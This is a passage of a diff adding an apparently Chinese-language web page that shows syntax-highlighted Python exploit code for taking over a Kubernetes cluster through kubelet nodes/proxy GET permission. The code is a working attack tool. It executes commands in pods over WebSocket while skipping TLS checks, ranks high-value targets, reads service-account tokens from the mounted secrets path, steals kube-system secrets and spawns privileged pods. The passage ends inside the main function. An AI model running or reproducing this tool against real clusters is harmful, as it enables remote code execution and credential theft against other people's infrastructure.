+    <span class="k">def</span><span class="w"> </span><span class="nf">full_takeover</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;完整集群接管&quot;&quot;&quot;</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;K8s Cluster Takeover via nodes/proxy GET&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
+
+        <span class="c1"># 1. 检查权限</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[*] Step 1: Checking stolen token permissions...&quot;</span><span class="p">)</span>
+        <span class="n">perms</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">check_permissions</span><span class="p">()</span>
+
+        <span class="c1"># 2. 窃取 Secrets</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[*] Step 2: Stealing kube-system secrets...&quot;</span><span class="p">)</span>
+        <span class="n">secrets</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">steal_secrets</span><span class="p">()</span>
+
+        <span class="c1"># 3. 创建特权 Pod</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[*] Step 3: Creating privileged pod...&quot;</span><span class="p">)</span>
+        <span class="n">pod</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_privileged_pod</span><span class="p">()</span>
+
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[+] Cluster takeover complete!&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Stolen </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">secrets</span><span class="p">)</span><span class="si">}</span><span class="s2"> secrets from kube-system&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Privileged pod: </span><span class="si">{</span><span class="n">pod</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Host filesystem accessible at /host&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<hr />
+<h2>3. Python WebSocket 攻击工具</h2>
+<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">K8s nodes/proxy GET → RCE 自动化利用工具</span>
+<span class="sd">无需 websocat, 纯 Python 实现 WebSocket exec</span>
+<span class="sd">&quot;&quot;&quot;</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">asyncio</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">ssl</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">urllib.parse</span><span class="w"> </span><span class="kn">import</span> <span class="n">quote</span>
+
+<span class="k">class</span><span class="w"> </span><span class="nc">K8sNodesProxyExploit</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;nodes/proxy GET 权限利用工具&quot;&quot;&quot;</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">token</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">node_ip</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">port</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">10250</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">token</span> <span class="o">=</span> <span class="n">token</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">node_ip</span> <span class="o">=</span> <span class="n">node_ip</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">port</span> <span class="o">=</span> <span class="n">port</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">ssl_ctx</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">create_default_context</span><span class="p">()</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">ssl_ctx</span><span class="o">.</span><span class="n">check_hostname</span> <span class="o">=</span> <span class="kc">False</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">ssl_ctx</span><span class="o">.</span><span class="n">verify_mode</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">CERT_NONE</span>
+
+    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">websocket_exec</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">namespace</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">pod</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> 
+                              <span class="n">container</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">command</span><span class="p">:</span> <span class="nb">list</span><span class="p">[</span><span class="nb">str</span><span class="p">])</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">        通过 WebSocket 在目标容器中执行命令</span>
+<span class="sd">        利用 GET 握手绕过 RBAC CREATE 检查</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="kn">import</span><span class="w"> </span><span class="nn">websockets</span>
+
+        <span class="c1"># 构造 WebSocket URL</span>
+        <span class="c1"># Kubelet exec 端点格式: /exec/{namespace}/{pod}/{container}</span>
+        <span class="n">cmd_params</span> <span class="o">=</span> <span class="s2">&quot;&amp;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="sa">f</span><span class="s2">&quot;command=</span><span class="si">{</span><span class="n">quote</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">command</span><span class="p">])</span>
+        <span class="n">url</span> <span class="o">=</span> <span class="p">(</span>
+            <span class="sa">f</span><span class="s2">&quot;wss://</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">node_ip</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">port</span><span class="si">}</span><span class="s2">/exec/&quot;</span>
+            <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">namespace</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">pod</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">container</span><span class="si">}</span><span class="s2">&quot;</span>
+            <span class="sa">f</span><span class="s2">&quot;?output=1&amp;error=1&amp;</span><span class="si">{</span><span class="n">cmd_params</span><span class="si">}</span><span class="s2">&quot;</span>
+        <span class="p">)</span>
+
+        <span class="c1"># WebSocket 握手使用 HTTP GET</span>
+        <span class="c1"># Kubelet auth.go 将 GET 映射为 RBAC GET verb</span>
+        <span class="c1"># 如果用户有 nodes/proxy GET 权限 → 授权通过</span>
+        <span class="c1"># WebSocket 升级后不再做 CREATE 检查</span>
+
+        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s2">&quot;Authorization&quot;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&quot;Bearer </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">token</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span>
+        <span class="p">}</span>
+
+        <span class="c1"># v4.channel.k8s.io 是 K8s WebSocket 子协议</span>
+        <span class="c1"># v4 = 4通道 (stdin, stdout, stderr, error)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="k">async</span> <span class="k">with</span> <span class="n">websockets</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span>
+                <span class="n">url</span><span class="p">,</span>
+                <span class="n">ssl</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">ssl_ctx</span><span class="p">,</span>
+                <span class="n">additional_headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
+                <span class="n">subprotocols</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;v4.channel.k8s.io&quot;</span><span class="p">],</span>
+                <span class="n">open_timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span>
+                <span class="n">close_timeout</span><span class="o">=</span><span class="mi">5</span>
+            <span class="p">)</span> <span class="k">as</span> <span class="n">ws</span><span class="p">:</span>
+                <span class="c1"># 读取输出</span>
+                <span class="n">output</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+                <span class="k">try</span><span class="p">:</span>
+                    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+                        <span class="n">message</span> <span class="o">=</span> <span class="k">await</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">wait_for</span><span class="p">(</span><span class="n">ws</span><span class="o">.</span><span class="n">recv</span><span class="p">(),</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+                        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">):</span>
+                            <span class="c1"># K8s WebSocket 协议: 第一个字节是通道号</span>
+                            <span class="c1"># 通道 1 = stdout, 通道 2 = stderr, 通道 3 = error</span>
+                            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">message</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+                                <span class="n">channel</span> <span class="o">=</span> <span class="n">message</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+                                <span class="n">data</span> <span class="o">=</span> <span class="n">message</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
+                                <span class="k">if</span> <span class="n">channel</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">):</span>  <span class="c1"># stdout or stderr</span>
+                                    <span class="n">output</span> <span class="o">+=</span> <span class="n">data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s2">&quot;replace&quot;</span><span class="p">)</span>
+                <span class="k">except</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">TimeoutError</span><span class="p">:</span>
+                    <span class="k">pass</span>
+
+                <span class="k">return</span> <span class="n">output</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+
+        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="k">return</span> <span class="sa">f</span><span class="s2">&quot;Error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span>
+
+    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">enumerate_pods</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">list</span><span class="p">:</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;枚举 Node 上所有运行的 Pod&quot;&quot;&quot;</span>
+        <span class="kn">import</span><span class="w"> </span><span class="nn">urllib.request</span>
+
+        <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;https://</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">node_ip</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">port</span><span class="si">}</span><span class="s2">/pods&quot;</span>
+        <span class="n">req</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+        <span class="n">req</span><span class="o">.</span><span class="n">add_header</span><span class="p">(</span><span class="s2">&quot;Authorization&quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;Bearer </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">token</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+        <span class="n">response</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">context</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">ssl_ctx</span><span class="p">)</span>
+        <span class="n">pods_data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+
+        <span class="n">pods</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">pods_data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;items&quot;</span><span class="p">,</span> <span class="p">[]):</span>
+            <span class="n">pod_info</span> <span class="o">=</span> <span class="p">{</span>
+                <span class="s2">&quot;namespace&quot;</span><span class="p">:</span> <span class="n">item</span><span class="p">[</span><span class="s2">&quot;metadata&quot;</span><span class="p">][</span><span class="s2">&quot;namespace&quot;</span><span class="p">],</span>
+                <span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="n">item</span><span class="p">[</span><span class="s2">&quot;metadata&quot;</span><span class="p">][</span><span class="s2">&quot;name&quot;</span><span class="p">],</span>
+                <span class="s2">&quot;containers&quot;</span><span class="p">:</span> <span class="p">[</span><span class="n">c</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">item</span><span class="p">[</span><span class="s2">&quot;spec&quot;</span><span class="p">][</span><span class="s2">&quot;containers&quot;</span><span class="p">]],</span>
+                <span class="s2">&quot;service_account&quot;</span><span class="p">:</span> <span class="n">item</span><span class="p">[</span><span class="s2">&quot;spec&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;serviceAccountName&quot;</span><span class="p">,</span> <span class="s2">&quot;default&quot;</span><span class="p">),</span>
+                <span class="s2">&quot;host_network&quot;</span><span class="p">:</span> <span class="n">item</span><span class="p">[</span><span class="s2">&quot;spec&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;hostNetwork&quot;</span><span class="p">,</span> <span class="kc">False</span><span class="p">),</span>
+                <span class="s2">&quot;host_pid&quot;</span><span class="p">:</span> <span class="n">item</span><span class="p">[</span><span class="s2">&quot;spec&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;hostPID&quot;</span><span class="p">,</span> <span class="kc">False</span><span class="p">),</span>
+                <span class="s2">&quot;privileged&quot;</span><span class="p">:</span> <span class="nb">any</span><span class="p">(</span>
+                    <span class="n">c</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;securityContext&quot;</span><span class="p">,</span> <span class="p">{})</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;privileged&quot;</span><span class="p">,</span> <span class="kc">False</span><span class="p">)</span>
+                    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">item</span><span class="p">[</span><span class="s2">&quot;spec&quot;</span><span class="p">][</span><span class="s2">&quot;containers&quot;</span><span class="p">]</span>
+                <span class="p">)</span>
+            <span class="p">}</span>
+            <span class="n">pods</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">pod_info</span><span class="p">)</span>
+
+        <span class="k">return</span> <span class="n">pods</span>
+
+    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">find_high_value_targets</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">pods</span><span class="p">:</span> <span class="nb">list</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">list</span><span class="p">:</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;识别高价值目标 Pod&quot;&quot;&quot;</span>
+        <span class="n">high_value</span> <span class="o">=</span> <span class="p">[]</span>
+
+        <span class="k">for</span> <span class="n">pod</span> <span class="ow">in</span> <span class="n">pods</span><span class="p">:</span>
+            <span class="n">score</span> <span class="o">=</span> <span class="mi">0</span>
+            <span class="n">reasons</span> <span class="o">=</span> <span class="p">[]</span>
+
+            <span class="c1"># kube-system 命名空间</span>
+            <span class="k">if</span> <span class="n">pod</span><span class="p">[</span><span class="s2">&quot;namespace&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;kube-system&quot;</span><span class="p">:</span>
+                <span class="n">score</span> <span class="o">+=</span> <span class="mi">3</span>
+                <span class="n">reasons</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;kube-system namespace&quot;</span><span class="p">)</span>
+
+            <span class="c1"># 特权容器</span>
+            <span class="k">if</span> <span class="n">pod</span><span class="p">[</span><span class="s2">&quot;privileged&quot;</span><span class="p">]:</span>
+                <span class="n">score</span> <span class="o">+=</span> <span class="mi">5</span>
+                <span class="n">reasons</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;privileged container&quot;</span><span class="p">)</span>
+
+            <span class="c1"># hostNetwork</span>
+            <span class="k">if</span> <span class="n">pod</span><span class="p">[</span><span class="s2">&quot;host_network&quot;</span><span class="p">]:</span>
+                <span class="n">score</span> <span class="o">+=</span> <span class="mi">2</span>
+                <span class="n">reasons</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;hostNetwork&quot;</span><span class="p">)</span>
+
+            <span class="c1"># hostPID</span>
+            <span class="k">if</span> <span class="n">pod</span><span class="p">[</span><span class="s2">&quot;host_pid&quot;</span><span class="p">]:</span>
+                <span class="n">score</span> <span class="o">+=</span> <span class="mi">2</span>
+                <span class="n">reasons</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;hostPID&quot;</span><span class="p">)</span>
+
+            <span class="c1"># 高权限 ServiceAccount</span>
+            <span class="k">if</span> <span class="n">pod</span><span class="p">[</span><span class="s2">&quot;service_account&quot;</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">(</span><span class="s2">&quot;default&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">):</span>
+                <span class="n">score</span> <span class="o">+=</span> <span class="mi">2</span>
+                <span class="n">reasons</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;SA: </span><span class="si">{</span><span class="n">pod</span><span class="p">[</span><span class="s1">&#39;service_account&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+            <span class="k">if</span> <span class="n">score</span> <span class="o">&gt;=</span> <span class="mi">3</span><span class="p">:</span>
+                <span class="n">high_value</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
+                    <span class="o">**</span><span class="n">pod</span><span class="p">,</span>
+                    <span class="s2">&quot;score&quot;</span><span class="p">:</span> <span class="n">score</span><span class="p">,</span>
+                    <span class="s2">&quot;reasons&quot;</span><span class="p">:</span> <span class="n">reasons</span>
+                <span class="p">})</span>
+
+        <span class="c1"># 按分数排序</span>
+        <span class="n">high_value</span><span class="o">.</span><span class="n">sort</span><span class="p">(</span><span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="p">[</span><span class="s2">&quot;score&quot;</span><span class="p">],</span> <span class="n">reverse</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">high_value</span>
+
+    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">steal_sa_token</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">namespace</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">pod</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> 
+                              <span class="n">container</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;从目标 Pod 偷取 ServiceAccount Token&quot;&quot;&quot;</span>
+        <span class="n">command</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;cat&quot;</span><span class="p">,</span> <span class="s2">&quot;/var/run/secrets/kubernetes.io/serviceaccount/token&quot;</span><span class="p">]</span>
+        <span class="n">token</span> <span class="o">=</span> <span class="k">await</span> <span class="bp">self</span><span class="o">.</span><span class="n">websocket_exec</span><span class="p">(</span><span class="n">namespace</span><span class="p">,</span> <span class="n">pod</span><span class="p">,</span> <span class="n">container</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">token</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+
+    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">run_exploit</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;执行完整利用链&quot;&quot;&quot;</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;K8s nodes/proxy GET → RCE Exploit&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
+
+        <span class="c1"># Step 1: 枚举 Pod</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[*] Step 1: Enumerating pods on node...&quot;</span><span class="p">)</span>
+        <span class="n">pods</span> <span class="o">=</span> <span class="k">await</span> <span class="bp">self</span><span class="o">.</span><span class="n">enumerate_pods</span><span class="p">()</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    Found </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">pods</span><span class="p">)</span><span class="si">}</span><span class="s2"> pods&quot;</span><span class="p">)</span>
+
+        <span class="c1"># Step 2: 识别高价值目标</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[*] Step 2: Identifying high-value targets...&quot;</span><span class="p">)</span>
+        <span class="n">targets</span> <span class="o">=</span> <span class="k">await</span> <span class="bp">self</span><span class="o">.</span><span class="n">find_high_value_targets</span><span class="p">(</span><span class="n">pods</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">t</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">targets</span><span class="p">[:</span><span class="mi">5</span><span class="p">]):</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    [</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">] </span><span class="si">{</span><span class="n">t</span><span class="p">[</span><span class="s1">&#39;namespace&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">t</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;        Score: </span><span class="si">{</span><span class="n">t</span><span class="p">[</span><span class="s1">&#39;score&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2"> | Reasons: </span><span class="si">{</span><span class="s1">&#39;, &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">t</span><span class="p">[</span><span class="s1">&#39;reasons&#39;</span><span class="p">])</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">targets</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[-] No high-value targets found&quot;</span><span class="p">)</span>
+            <span class="k">return</span>
+
+        <span class="c1"># Step 3: 在高价值目标中执行命令</span>
+        <span class="n">target</span> <span class="o">=</span> <span class="n">targets</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[*] Step 3: Executing commands in </span><span class="si">{</span><span class="n">target</span><span class="p">[</span><span class="s1">&#39;namespace&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">target</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+        <span class="n">container</span> <span class="o">=</span> <span class="n">target</span><span class="p">[</span><span class="s2">&quot;containers&quot;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
+
+        <span class="c1"># 执行 id 命令确认权限</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[*] Executing: id&quot;</span><span class="p">)</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="k">await</span> <span class="bp">self</span><span class="o">.</span><span class="n">websocket_exec</span><span class="p">(</span>
+            <span class="n">target</span><span class="p">[</span><span class="s2">&quot;namespace&quot;</span><span class="p">],</span> <span class="n">target</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">],</span> <span class="n">container</span><span class="p">,</span> <span class="p">[</span><span class="s2">&quot;id&quot;</span><span class="p">]</span>
+        <span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    Output: </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+        <span class="c1"># Step 4: 偷取 ServiceAccount Token</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[*] Step 4: Stealing ServiceAccount Token...&quot;</span><span class="p">)</span>
+        <span class="n">stolen_token</span> <span class="o">=</span> <span class="k">await</span> <span class="bp">self</span><span class="o">.</span><span class="n">steal_sa_token</span><span class="p">(</span>
+            <span class="n">target</span><span class="p">[</span><span class="s2">&quot;namespace&quot;</span><span class="p">],</span> <span class="n">target</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">],</span> <span class="n">container</span>
+        <span class="p">)</span>
+        <span class="k">if</span> <span class="n">stolen_token</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">stolen_token</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">50</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    [+] Token stolen! (length: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">stolen_token</span><span class="p">)</span><span class="si">}</span><span class="s2">)&quot;</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    [+] Token (first 50): </span><span class="si">{</span><span class="n">stolen_token</span><span class="p">[:</span><span class="mi">50</span><span class="p">]</span><span class="si">}</span><span class="s2">...&quot;</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    [-] Failed to steal token&quot;</span><span class="p">)</span>
+            <span class="k">return</span>
+
+        <span class="c1"># Step 5: 使用偷来的 Token 访问 API Server</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[*] Step 5: Using stolen token to access API Server...&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    Token can be used with kubectl:&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    KUBE_TOKEN=</span><span class="si">{</span><span class="n">stolen_token</span><span class="p">[:</span><span class="mi">30</span><span class="p">]</span><span class="si">}</span><span class="s2">... kubectl --server=&lt;API_SERVER&gt; auth can-i --list&quot;</span><span class="p">)</span>
+
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[+] Exploit complete!&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Cluster may be fully compromised&quot;</span><span class="p">)</span>
+
+
+<span class="c1"># === 使用方式 ===</span>
+<span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
+    <span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
+
+    <span class="c1"># 从环境变量或文件读取 Token</span>
+    <span class="n">token</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;K8S_TOKEN&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">token</span><span class="p">:</span>
+        <span class="n">token_path</span> <span class="o">=</span> <span class="s2">&quot;/var/run/secrets/kubernetes.io/serviceaccount/token&quot;</span>
+        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">token_path</span><span class="p">):</span>
